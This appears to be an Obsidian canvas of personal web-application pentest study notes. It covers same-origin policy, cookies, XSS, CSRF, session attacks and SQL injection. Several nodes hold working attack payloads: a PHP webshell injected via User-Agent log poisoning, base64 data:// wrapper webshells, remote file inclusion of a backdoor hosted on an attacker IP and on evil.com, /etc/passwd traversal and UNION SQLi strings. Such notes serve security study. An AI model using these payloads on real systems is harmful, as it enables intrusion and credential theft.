{
	"nodes":[
		{"id":"c0f69002224338f2","type":"text","text":"# Cross Origin Resource Sharing (CORS)\nSet of specs built to allow a browser to access a few resources by bypassing the same origin policy. The CORS architecture uses custom HTTP response headers and relies upon server-side components or server-side scripting languages.","x":440,"y":140,"width":560,"height":180},
		{"id":"767173c5cca979a8","type":"text","text":"# Same Origin Policy (SOP)\nhttps://portswigger.net/web-security/cors/same-origin-policy\nhttps://softwareskill.pl/same-origin-policy-sop-bezpieczenstwo-web-aplikacji\n\nThis policy prevents a script or a document from getting or setting properties of another document that comes from a different origin.\nNOTE: CSS stylesheets, images and scripts are loaded by the browser without consulting the policy. Same Origin Policy (SOP) is consulted when cross-site HTTP requests are initiated from within client side scripts (IE: JavaScript), or when an Ajax request is run.\n\nThe main rule of SOP is: \n*A document can access (through JavaScript) the properties of another document only if they have the same origin.* \nMore precisely, the browser always performs the request successfully but it returns the response to the user only if the SOP is respected.\nWith the term document, we are referring to an HTML page, an iframe included in the main page, or a response to an Ajax request. Images, style information (*.css) and JavaScript files (*.js) are excluded from the previous statement; they are always accessible regardless their origin, and the browser loads them without consulting SOP.\n\n\nLet us see some SOP examples applied to the following address: http://els.ptp.site/index.php: \n\n|URL| SOP| Reason|\n|-|-|-|\n|http://els.ptp.site/admin/index.php| OK | Same protocol, host and port |\n|https://els.ptp.site/index.php |X | Different protocol |\n|http://els.ptp.site/index.php:8080 |X | Different port |\n|http://www.els.ptp.site/index.php |X | Different host  |\nContent from `about:blank`, `JavaScript:` and `data:` inherits the origin.\n# What would it happen if SOP did not exist?\nYour evil friend could craft a malicious page, and convince you to visit it. Once you visited the page, he could then have (some) access to personal information from your bank account.\n","x":-400,"y":140,"width":800,"height":900},
		{"id":"9a65e2f72f9e5f16","type":"text","text":"# Cookies\nHTTP itself is a stateless protocol. This means that a website cannot retain the state of visit between different HTTP requests without mechanisms such as sessions or cookies.\nInvented to essentially make HTTP stateful.\n\nA server can set a cookie via the `Set-Cookie` HTTP header field in a response message. A cookie has a predefined format. It contains the following fields:Domain, Expires, Path, Content, HTTP Only Flag, Secure Flag.\n1. **Domain**<br>The scope of this cookie will be `.google.com` Domain A cannot set a cookie for domain B. The browser will sends A's cookie in accordance with the above domain scope (to A and all of its subdomains), including the path and the expiration date. <br>There are two important considerations about the domain field:<br>- leading\".\", if present, is ignored:<br>- if the server does not specify the domain attribute, the browser will automatically set the domain as the server domain and set the cookieâ€™s host-only flag. This means that the cookie will be sent only to that precise hostname.<br><br>\n1. **Expires**<br>Gives the cookie a time constraint. The cookie will only be sent to the server if it has not expired. Session cookies expire when the session exits.<br><br>\n1. **Path**<br>Specifies for which requests, within that domain, the browser needs to send the cookie. For cookies with `path=/downloads`, all subsequent requests to: `/downloads`, `/downloads/foo`, `/downloads/foo/bar` will include this cookie. The browser will **not send** this cookie for requests to `/blog` or `/members`<br><br>\n1. **Content**<br>Carry a number of values at once. A server can set multiple values with a single `Set-Cookie` header by specifying multiple `KEY=Value` pairs. For example: `Set-Cookie: Username=\"john\"; Authenticated=\"1\"`<br><br>\n1. **HTTP Only<br>Used to force the browser to send the cookie only through HTTP. This flag prevents the cookie from being read via JavaScript, Flash, Java or any other non-HTML technology. This is a protection mechanism against cookie stealing via XSS.<br><br>\n1. **Secure**<br>forces the browser to send the cookie only through HTTPS (SSL). This prevents the cookie from being sent in clear text.","x":1040,"y":140,"width":820,"height":1040},
		{"id":"778ebb43b7597d7c","type":"link","url":"https://softwareskill.pl/same-origin-policy-sop-bezpieczenstwo-web-aplikacji","x":-400,"y":-320,"width":1400,"height":400},
		{"id":"199ac2d2dcee95bb","type":"link","url":"https://portswigger.net/web-security/cors/same-origin-policy","x":-400,"y":-800,"width":1400,"height":400},
		{"id":"ef3b880895b7702a","type":"text","text":"# WEB APP Pentest","x":140,"y":-1280,"width":500,"height":200,"color":"1"},
		{"id":"7616ff1daac38b56","type":"text","text":"# Proxy","x":2560,"y":-1280,"width":300,"height":80,"color":"1"},
		{"id":"075e11931bfb64f5","type":"link","url":"https://www.zaproxy.org/docs/desktop/","x":2400,"y":-200,"width":1266,"height":400},
		{"id":"f00c0839c83626ab","type":"link","url":"https://portswigger.net/burp/documentation/desktop/getting-started/intercepting-http-traffic","x":2400,"y":-840,"width":1266,"height":520},
		{"id":"121b7cb3e5209343","type":"text","text":"# Fingerpirnting Web Server","x":4720,"y":-1280,"width":460,"height":70,"color":"1"},
		{"id":"b0bdc56e9c09755d","type":"link","url":"https://www.netcraft.com/tools/","x":4277,"y":-920,"width":1346,"height":400},
		{"id":"a3c168caa39aa7a4","type":"text","text":"# manual webserver  fingerprinting\n## $ whatweb\n```bash\n$ whatweb -v <url>\n```\n# wappalyzer\n# fingerprinting web server modules\n## URL-rewriting\nApache - `.htacces` file\nIIS - `Ionic Isapi rewrite` or `Helicon Isapi rewrite`","x":4277,"y":-380,"width":663,"height":860},
		{"id":"123b730bb9cd6d7f","type":"text","text":"# Enumerate files/subdomains","x":6248,"y":-1280,"width":672,"height":120,"color":"1"},
		{"id":"00248b423dd4a798","type":"link","url":"https://searchdns.netcraft.com/","x":6080,"y":-520,"width":1160,"height":400},
		{"id":"964e16d8128bd074","type":"file","file":"NOTES/0. Redteam/WebAPP/whatweb.md","x":6080,"y":-980,"width":666,"height":160},
		{"id":"f40170262e3f361e","type":"text","text":"# $ dirbuster\n```bash\n$ dirbuster # graphical tools for directory enumeration\n```","x":6780,"y":-980,"width":673,"height":160},
		{"id":"b4406bc9aa890486","type":"file","file":"NOTES/99. TOOLS/dns/$ dnsenum.md","x":6780,"y":-800,"width":720,"height":160},
		{"id":"67b83caa85e348ad","type":"text","text":"# XSS\n- **Reflected**<br>It occurs when untrusted user data is sent to a web application and is immediately echoed back as untrusted content. Then, as usual, the browser receives the code from the web server response and renders it.\n- **Stored**<br>Malicious input is stored within the web application. Once this occurs, it is then echoed somewhere else within the web application and may be available to all visitors.\n- **DOM**<br>Form of cross-site scripting that exists only within client-side code. Generally speaking, this vulnerability lives within the DOM environment, thus within a page's client-side script itself and does not reach server-side code.<br>They are allowed when the JavaScript code uses the user supplied data as part of its logic.\n","x":7900,"y":-1020,"width":680,"height":460},
		{"id":"7db7194d1754f96b","type":"link","url":"https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html","x":7900,"y":-520,"width":680,"height":400},
		{"id":"d2834561ab584d0d","type":"text","text":"# XSS","x":8115,"y":-1280,"width":250,"height":60,"color":"1"},
		{"id":"79466758bbded884","type":"file","file":"mindmapa/PHP_server_data_exfiltration.md","x":8640,"y":-617,"width":949,"height":594},
		{"id":"12f510cb5b825030","type":"text","text":"# XSS\n```JS\n// reflected XSS payload that will cause an alert with your machines IP address\n<script>alert(window.location.hostname)</script>\n```\n```JS\n// reflected XSS payload that displays your own cookies\n<script>alert(document.cookie)</script>\n```","x":8640,"y":-980,"width":776,"height":280},
		{"id":"9862b2afd06deb25","type":"text","text":"# $ beef","x":7900,"y":-100,"width":250,"height":60},
		{"id":"915b35ac370908c6","type":"text","text":"# SQL Injection","x":10575,"y":-1280,"width":250,"height":60,"color":"1"},
		{"id":"ef46704ce35678e8","type":"text","text":"# Session Attacks","x":12245,"y":-1320,"width":335,"height":120,"color":"1"},
		{"id":"584d8d36ecf0335e","type":"text","text":"# CSRF\n\nvulnerability where a third-party web application is able to perform an action on the user's behalf. It is based on the fact that web applications can send requests to other web applications, without showing the response. Egzaple\n\n1. Bob (victim) visits amazon.com, logs in, then leaves the site without logging out. \n2. Bob then visits foo.com (malicious website) which inadvertently executes a request to amazon.com from the Bob's browser (such as buy a book). \n3. The victim browser sends this request, along with all the victim cookies. The request seems legit to amazon.com.\n\n\n```html\n<html><body> \n\t<img src=\"http://www.amazon.com/buy/123\"> \n</html></body>\n```\nIt is crucial that the **token must be random, unpredictable and change for at least every session**. Note: The token becomes useless when the application is also vulnerable to XSS.\nBecause of the same-origin policy, you cannot read the token set to *domain-vuln.com* from *domain-evil.com*. However, using a XSS exploit on *domain-vuln.com*, the JavaScript meant to steal the token (and use it in a new request) will be executed on the legit domain (domain- vuln.com).","x":12300,"y":-1060,"width":560,"height":520},
		{"id":"3fbe2be5c70c35fb","type":"link","url":"https://portswigger.net/web-security/csrf","x":12316,"y":-360,"width":904,"height":400},
		{"id":"23e5268af1e78209","type":"text","text":"# File and Resource Attacks\n ```\n# Path Traversal\nhttp://www.elsfoo.com/getFile?path=FileA418fS5fds.pdf\nhttp://www.elsfoo.com/getFile?path=../../../etc/passwd\n```\n```\n%00 # null byte\nfile_read (\"/htdocs/website/reports/\" user_input + \".pdf\");\n\n../../etc/passwd%00\n```\n## File Inclusion\n```bash\n# Local\nvisit.pl?url=../../../../etc/passwd\n\n# Remote\nvuln.php?page=http://evil.com/shell.txt # file with php code included in page and executed\n```\nIn order for the application to be vulnerable, the following conditions must apply:\n- The filetype is not checked against a whitelist of allowed formats \n- The filename and path of the uploaded file is known to the attacker or is guessable \n- The folder in which the file is placed allows the execution of server-side scripts\nA web developer should inspect the uploaded file at two different layers:\n- Metadata (name,extension, size, etc. )\n- Actual content","x":12880,"y":-1060,"width":600,"height":680},
		{"id":"c5ffc13a313f56ce","type":"text","text":"# Session Attacks\nThe **session identifier** is a unique key that identifies a userâ€™s session within a database of sessions. If an attacker manages to obtain it, he can impersonate another userâ€™s session.\nA strong session identifier is an ID that is: \n- Valid for only a single session\n- Time Limited\n- Purely random (thus unpredictable)\n\nA Session Hijack attack can happen by: \n- Exploiting an existing XSS vulnerability\n\t- Requirements: \n\t\t- An XSS vulnerability exists and you can execute your own payload through it \n\t\t- Session ID is sent through cookies on each HTTP request (this was an assumption) \n\t\t- Cookies are readable by JavaScript\n\t- Prevention: In order to prevent cookie stealing through XSS, making cookies inaccessible via JavaScript is necessary. This is as simple as creating the cookie with the \"HTTPONLY\" flag enabled.\n- Packet sniffing \n\t- Requirements:\n\t\t* Victim HTTP traffic can be sniffed (LAN or compromised gateway) \n\t\t* HTTP traffic must be unencrypted (No SSL)\n- Gaining direct access to server file system where sessions are stored\n- Finding session IDs in logs or  browser history (sessions carried through the URL)\n## Session fixation\n1. The attacker obtains a valid sessionID \n2. The attacker forces the victim to use this sessionID to establish a personal session with web server\n\nIn contrast to the previous attack, the attacker is not interested in stealing the sessionID; he instead creates one and forces the victim to use it.","x":11680,"y":-1060,"width":600,"height":800},
		{"id":"85f17e06d90cb862","type":"text","text":"HTTP HEADERS\n**The Secure flag** instructs the browser to only send the cookie over encrypted connections, such as HTTPS. This protects the cookie from being sent in clear text and captured over the network.\n\n**The HttpOnly flag** instructs the browser to deny JavaScript access to the cookie. If this flag is not set, we can use an XSS payload to steal the cookie.","x":7900,"y":120,"width":880,"height":180},
		{"id":"977f2084b51ac09d","type":"text","text":"# log poisoning (LFI > RCE)\n```bash\n# LFI example - reading log file (contain user agent) \nkali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log\n...\n192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] \"GET /meteor/index.php?page=admin.php HTTP/1.1\" 200 2218 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\"\n...\n```\n```bash\n# modify the User Agent to include the PHP code snippet (in Burp in request to be send )\n# snippet accepts a command via the cmd parameter and executes it via the PHP system4 function on the target system. \n...\nUser-Agent: <?php echo system($_GET['cmd']); ?>\n...\n\n# get response from server\n...\nGET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls\n...\n```","x":2218,"y":1733,"width":1622,"height":527},
		{"id":"0858699ccf035609","type":"text","text":"# PHP wrappers\n\nhttps://www.php.net/manual/en/wrappers.php\n\nuse wrappers to bypass filters or obtain code execution via **File Inclusion** vulnerabilities in PHP web applications.\ndisplay the contents of executable files such as **.php**\n\n# php://filter\nhttps://www.php.net/manual/en/wrappers.php.php#wrappers.php.filter\ndisplay the contents of files either with or without encodings like ROT134 or Base64.\n```bash\n$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php\n$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php\n$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php\n```\n# php://data\nembed data elements as plaintext or base64-encoded data in the running web application's code - alternative method when we cannot poison a local file with PHP code.\n```bash\n$ curl \"http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>\"\n\n$ echo -n '<?php echo system($_GET[\"cmd\"]);?>' | base64\n$ curl \"http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls\"\n```\n","x":2309,"y":2480,"width":1440,"height":1097},
		{"id":"da041d4f4a595cd4","type":"text","text":"# LFI\n\n","x":2500,"y":1260,"width":140,"height":80,"color":"1"},
		{"id":"80a67f42971d9a36","type":"text","text":"# RFI\n```bash\nkali@kali:/usr/share/webshells/php$ python -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n\n$ curl \"http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls\"\n$ curl http://192.168.160.16/meteor/index.php?page=http://192.168.45.173/simple-backdoor.php&cmd=cat+/home/elaine/.ssh/authorized_keys \n```","x":2840,"y":1400,"width":1272,"height":264},
		{"id":"b8d84914e680ee1a","type":"text","text":"# File Upload Vulnerabilities\n```bash\nseclists/Discovery/Web-Content/web-extensions-big.txt # web extensions to fuzz with names of files to upload webshell/reverse shell\n```","x":4720,"y":1300,"width":999,"height":152,"color":"1"},
		{"id":"90a01323801c38f2","type":"text","text":"# command injection\n```bash\nhttps://raw.githubusercontent.com/carlospolop/Auto_Wordlists/main/wordlists/command_injection.txt\n\n/usr/share/wordlists/seclists/Fuzzing/command-injection-commix.txt \n```","x":4720,"y":1600,"width":999,"height":240,"color":"1"},
		{"id":"205d7e1633c83976","type":"file","file":"NOTES/0. Redteam/WebAPP/sqlmap.md","x":10040,"y":-480,"width":845,"height":760},
		{"id":"25e2583f502d70b5","type":"text","text":"# $ jSQL\nhttps://miloserdov.org/?p=1682","x":10041,"y":-620,"width":845,"height":100},
		{"id":"a807ad4fed75ef26","type":"text","text":"[sql-injection-cheat-sheet](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)\n[sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list)\n[PayloadAllTheThings - SQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)\n[OWASP SQL injection testing - check points of this chapter](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)\n\n```bash\n/usr/share/wordlists/wfuzz/Injections/SQL.txt\n/usr/share/wordlists/seclists/Fuzzing/SQLi/...\n```","x":10925,"y":-620,"width":555,"height":280},
		{"id":"3d6a13d6f90748d1","type":"text","text":"https://medium.com/@opabravo/manually-exploit-blind-sql-injection-with-ffuf-92881a199345","x":10040,"y":340,"width":845,"height":120},
		{"id":"11946e63cd846974","type":"text","text":"# UNION based SQL injection\n1. Entry point detection\n\t1. `xxx -- // `\n2. Determine the number of columns in a query (by one way)\n    `for x in {1..15};do echo $x >> nums ;done # generate numbers for ORDER BY / GROUP BY`\n    `for x in {1..15};do python3 -c 'print(\"null,\"*'$x',\"null\")'>> nulls ;done # generate nulls for UNION SELECT`\n\t1. `' ORDER BY 1-- //` until not work\n\t2. `' GROUP BY 2-- //` until not work\n\t3. `' UNION SELECT null,null,null,...-- //` until work\n3. Extract data\n```SQL\n' UNION SELECT null, database(),null,null,null-- //\ndatabase() # current database name \nuser() # user\n@@version # MySQL version\n\n# show tables and columns of database\n' UNION SELECT null,table_name,column_name,table_schema,null from information_schema.columns WHERE table_schema=database()-- // # enum schema of current database inside of table where 2nd collumn is table name, 3rd is table schema and 4th is database name\n```\n","x":10045,"y":520,"width":1435,"height":702},
		{"id":"7b028e4262d2ba55","type":"file","file":"NOTES/0. Redteam/2. Services/TCP 3306 - MySQL.canvas","x":10815,"y":-1060,"width":665,"height":400},
		{"id":"54342ff3c74fc55d","type":"text","text":"# Connector Example\nThe code takes care of establishing and keeping the connection to the database by using connectors. Connectors are middle-ware between the web application and the database.\n```mermaid\ngraph TD\n\tConnector[Connector/ODBC]\n\tDSNConfiguration[DSN Configuration]\n\tDriverManager[Driver Manager]\n\tMySQLServer[MySQL Server]\n\tApplication --> Connector\n\tDriverManager --> Connector\n\tApplication --> DriverManager --> DSNConfiguration --> Connector --> MySQLServer\n```","x":11035,"y":-320,"width":445,"height":620},
		{"id":"5f1f4184b1457ea2","type":"file","file":"NOTES/0. Redteam/2. Services/TCP 1433 - MSSQL.canvas","x":10040,"y":-1060,"width":580,"height":400},
		{"id":"d6a2c683d02f74dc","x":10128,"y":1485,"width":952,"height":615,"type":"text","text":"# Methodology\nHow I test for SQL Injection\n1. Identify\n\t1. Identify The Injection (Tool or Manual)\n\t2. Determine Injection Type (Integer or String)\n2. Attack\n\t1. Error-Based SQL Injection (Easiest)\n\t2. Union-Based SQL Injection (Great for data extraction)\n\t3. Blind SQL Injection (Worst case....last resort)\n\nMS-SQL syntax"}
	],
	"edges":[
		{"id":"7298d7392fb085f3","fromNode":"977f2084b51ac09d","fromSide":"bottom","toNode":"0858699ccf035609","toSide":"top"},
		{"id":"c75d14af62a1d0ce","fromNode":"da041d4f4a595cd4","fromSide":"right","toNode":"80a67f42971d9a36","toSide":"left"}
	]
}